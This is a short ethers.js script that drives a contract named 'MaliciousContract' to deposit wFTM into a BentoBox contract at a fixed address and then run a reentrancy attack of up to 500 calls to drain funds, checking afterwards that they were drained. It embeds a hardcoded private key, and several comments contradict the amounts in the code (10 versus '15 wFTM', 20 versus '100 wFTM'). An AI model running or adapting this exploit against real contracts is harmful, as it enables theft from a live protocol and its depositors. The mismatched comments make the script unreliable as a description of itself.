// Step 0: Set up the owner signer using the private key
const OWNER_PRIVATE_KEY = "0a30f426a2d5f794771d47255e330dbed21859e15f9e977cebeda0e83ff58c08";
const ownerSigner = new ethers.Wallet(OWNER_PRIVATE_KEY, ethers.provider);

// Define contract addresses and parameters
const BENTOBOX_ADDRESS = "0xF5BCE5077908a1b7370B9ae04AdC565EBd643966";  // BentoBox target address
const WFTM_ADDRESS = "0x21be370D5312f44cB42ce377BC9b8a0cEF1A4C83";     // wFTM token address
const MALICIOUS_CONTRACT_ADDRESS = "0x39801890ffc51120eec92FBdeeDfdc9C3935550c"; // Deployed MaliciousContract address

// Attach to the deployed contracts
const wFTM = await ethers.getContractAt("@openzeppelin/contracts/token/ERC20/IERC20.sol:IERC20", WFTM_ADDRESS);
const maliciousContract = await ethers.getContractAt("MaliciousContract", MALICIOUS_CONTRACT_ADDRESS, ownerSigner);

// Set up the deposit and attack parameters based on your balance limits
const depositAmount = ethers.utils.parseUnits("10", 18); // Total deposit of 15 wFTM
const attackAmount = ethers.utils.parseUnits("20", 18); // Attempt to withdraw 100 wFTM per call
const reentrancyLimit = 500; // Set reentrancy limit to 500 calls
const GAS_PRICE = "1000"; // Set the gas price to 1000 Gwei

// Step 1: Deposit 15 wFTM into BentoBox through MaliciousContract
const txDeposit = await maliciousContract.connect(ownerSigner).deposit(depositAmount, {
    gasPrice: ethers.utils.parseUnits(GAS_PRICE, "gwei")
});
await txDeposit.wait();
console.log("Deposited 15 wFTM into BentoBox through MaliciousContract");

// Step 2: Execute the Attack to Withdraw Funds
const txAttack = await maliciousContract.connect(ownerSigner).attack(attackAmount, reentrancyLimit, {
    gasPrice: ethers.utils.parseUnits(GAS_PRICE, "gwei")
});
await txAttack.wait();
console.log("Attack executed to withdraw wFTM from BentoBox into MaliciousContract");

// Optional Step 3: Check the balance of MaliciousContract to verify funds were drained
const balance = await wFTM.balanceOf(MALICIOUS_CONTRACT_ADDRESS);
console.log("Final wFTM balance of MaliciousContract:", ethers.utils.formatUnits(balance, 18), "wFTM");
